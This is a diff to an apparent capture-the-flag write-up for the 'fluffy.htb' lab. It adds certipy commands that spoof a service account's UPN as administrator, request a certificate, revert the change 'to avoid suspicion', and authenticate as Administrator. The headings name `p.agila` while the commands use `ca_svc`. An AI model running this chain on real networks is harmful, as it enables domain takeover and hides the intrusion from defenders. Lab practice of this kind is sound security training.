@@ -231,31 +231,31 @@ To exploit this, we will change the UPN of the user `p.agila` to Administrator, 
 
 17.1. Change UPN of `p.agila`
 
-``
+`certipy account -k -target dc01.fluffy.htb -upn 'administrator' -user 'ca_svc' update`
 
 <img width="730" height="138" alt="image" src="https://github.com/user-attachments/assets/7d0d3cd3-0f4b-4b69-a9bb-d64c110b9774" />
 
 17.2 Confirm UPN is changed
 
-``
+`certipy account -k -target dc01.fluffy.htb -user 'ca_svc' read`
 
 <img width="814" height="269" alt="image" src="https://github.com/user-attachments/assets/604c9a44-1427-4e46-8877-28edec29c87a" />
 
 17.3 Request certificate for `Administrator`
 
-``
+`certipy req -k -target dc01.fluffy.htb -dc-host dc01.fluffy.htb -dc-ip 10.129.10.195 -ca fluffy-DC01-CA -template User`
 
 <img width="1004" height="189" alt="image" src="https://github.com/user-attachments/assets/1bd7caf8-f7b6-4f82-947e-ac90d91a78a2" />
 
 17.4 Change back UPN of `ca_svc` account to avoid suspicion
 
-``
+`certipy account -k -target dc01.fluffy.htb -upn 'ca_svc' -user 'ca_svc' update`
 
 <img width="672" height="137" alt="image" src="https://github.com/user-attachments/assets/07a16922-8177-408e-a54f-d087f26a0451" />
 
 17.5 Authenticate with impersonating certificate
 
-``
+`certipy auth -pfx administrator.pfx -dc-ip 10.129.10.195 -domain fluffy.htb`
 
 <img width="918" height="207" alt="image" src="https://github.com/user-attachments/assets/7e92434a-e252-436d-800b-811987665242" />
 
